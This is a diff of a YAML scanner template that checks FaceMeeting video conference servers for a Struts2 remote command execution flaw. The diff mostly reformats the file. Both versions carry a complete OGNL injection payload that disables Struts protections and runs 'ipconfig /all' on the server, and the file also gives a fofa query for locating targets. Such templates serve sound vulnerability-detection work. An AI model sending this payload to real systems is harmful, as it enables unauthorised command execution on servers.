@@ -1,23 +1,36 @@
+expression: r0()
 id: facemeeting-struts2-rce
-
 info:
-  name: 飞视美 视频会议系统 Struts2 远程命令执行漏洞
   author: daffainfo
+  description: "\u98DE\u89C6\u7F8E\uFF08facemeeting\uFF09\uFF1Afacemeeting\uFF0C\u5373\
+    \u98DE\u89C6\u7F8E\uFF0C\u96B6\u5C5E\u98DE\u9C7C\u661F\u79D1\u6280\u6709\u9650\
+    \u516C\u53F8\uFF0C\u5750\u843D\u5728\u56DB\u5DDD\u6210\u90FD\uFF0C\u4EE5SAAS\u6A21\
+    \u5F0F\u63D0\u4F9B\u56FD\u9645\u6807\u51C6\u7684\u591A\u5A92\u4F53\u901A\u8BAF\
+    \u670D\u52A1\uFF0C\u4E3A\u5373\u79DF\u5373\u7528\u7684\u5168\u65B0\u4E00\u4EE3\
+    \u89C6\u9891\u4F1A\u8BAE\u4EA7\u54C1\u3002\u98DE\u89C6\u7F8E\u4E13\u6CE8\u63D0\
+    \u4F9B\u9AD8\u6548\u3001\u667A\u80FD\u7684\u89C6\u9891\u4F1A\u8BAE\u89E3\u51B3\
+    \u65B9\u6848\uFF0C\u670D\u52A1\u4E2D\u5C0F\u4F01\u4E1A\u5404\u7C7B\u4F1A\u8BAE\
+    \u3001\u534F\u540C\u529E\u516C\u7B49\u9886\u57DF\uFF0C\u901A\u8FC7\u7F51\u7EDC\
+    \u8FDB\u884C\u5F02\u5730\u5B9E\u65F6\u7684\u97F3\u89C6\u9891\u6C9F\u901A\uFF0C\
+    \u534F\u52A9\u4E2D\u5C0F\u4F01\u4E1A\u6784\u5EFA\u9AD8\u6548\u3001\u667A\u80FD\
+    \u7684\u7EDF\u4E00\u901A\u4FE1\u7CFB\u7EDF\u5E73\u53F0\u3002\u98DE\u89C6\u7F8E\
+    \ \u89C6\u9891\u4F1A\u8BAE\u7CFB\u7EDF\u5B58\u5728Struts2\u8FDC\u7A0B\u547D\u4EE4\
+    \u6267\u884C\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\
+    \u4EE5\u83B7\u53D6\u670D\u52A1\u5668\u6743\u9650\u3002\nfofa-query: app=\"\u98DE\
+    \u89C6\u7F8E-\u89C6\u9891\u4F1A\u8BAE\u7CFB\u7EDF\"\n"
+  name: "\u98DE\u89C6\u7F8E \u89C6\u9891\u4F1A\u8BAE\u7CFB\u7EDF Struts2 \u8FDC\u7A0B\
+    \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
+  reference:
+  - https://mp.weixin.qq.com/s/mBAaR8bA2eibUgBcLDipfA
   severity: critical
   verified: true
-  description: |
-    飞视美（facemeeting）：facemeeting，即飞视美，隶属飞鱼星科技有限公司，坐落在四川成都，以SAAS模式提供国际标准的多媒体通讯服务，为即租即用的全新一代视频会议产品。飞视美专注提供高效、智能的视频会议解决方案，服务中小企业各类会议、协同办公等领域，通过网络进行异地实时的音视频沟通，协助中小企业构建高效、智能的统一通信系统平台。飞视美 视频会议系统存在Struts2远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限。
-    fofa-query: app="飞视美-视频会议系统"
-  reference:
-    - https://mp.weixin.qq.com/s/mBAaR8bA2eibUgBcLDipfA
-    
-
 rules:
   r0:
+    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
     request:
+      body: '(''\43_memberAccess.allowStaticMethodAccess'')(a)=true&(b)((''\43context[\''xwork.MethodAccessor.denyMethodExecution\'']\75false'')(b))&(''\43c'')((''\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'')(c))&(g)((''\43mycmd\75\''ipconfig
+        /all\'''')(d))&(h)((''\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)'')(d))&(i)((''\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())'')(d))&(j)((''\43myres\75new\40byte[51020]'')(d))&(k)((''\43mydat.readFully(\43myres)'')(d))&(l)((''\43mystr\75new\40java.lang.String(\43myres)'')(d))&(m)((''\43myout\75@org.apache.struts2.ServletActionContext@getResponse()'')(d))&(n)((''\43myout.getWriter().println(\43mystr)'')(d))
+
+        '
       method: POST
       path: /confinfoaction!showallConfinfos.action
-      body: |
-        ('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'ipconfig /all\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
-    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
-expression: r0()
